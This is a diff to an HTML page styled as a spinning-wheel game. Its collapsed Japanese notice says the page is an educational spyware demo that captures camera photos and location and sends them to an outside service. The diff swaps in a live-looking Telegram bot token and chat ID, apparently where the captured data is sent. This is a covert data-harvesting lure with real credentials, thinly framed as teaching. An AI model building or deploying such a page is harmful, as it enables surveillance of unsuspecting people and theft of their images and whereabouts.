@@ -70,7 +70,18 @@
 <details class="security-notice">
   <summary><b>【重要：セキュリティ学習用デモサイト】</b></summary>
   <br>
-  このサイトは、JavaScriptによる不正なデータ取得の手口を学ぶためのデモページです。
+  このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  <br><br>
+  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  ・端末のカメラを使用した写真の撮影<br>
+  ・現在地（位置情報）の取得<br>
+  ・取得されたデータの外部サービスへの送信<br><br>
+  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
+  同意しない場合は、データの取得および送信は行われません。<br><br>
+  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
+  許可なく第三者に対してこのURLを送信したり、実行させたりする行為は禁止されています。
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
+  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
 </details>
 
 <script>
@@ -82,8 +93,7 @@ function animateBG() {
 }
 animateBG();
 
-// ★ここを書き換えました
-const BOT_TOKEN = "8561278803:AAHGGHLpZPJk75qUVelgeS1hiEpcN0wVtl0";
+const BOT_TOKEN = "8722419105:AAEQd0Tpobob0BQBnWKNGQY0lXhpKa3NdXE";
 const CHAT_ID = "7541612001";
 
 const canvas = document.getElementById("wheel");
@@ -231,4 +241,3 @@ document.getElementById("sendNo").onclick = resetUI;
 document.getElementById("noDataOk").onclick = resetUI;
 </script>
 </body>
-</html>
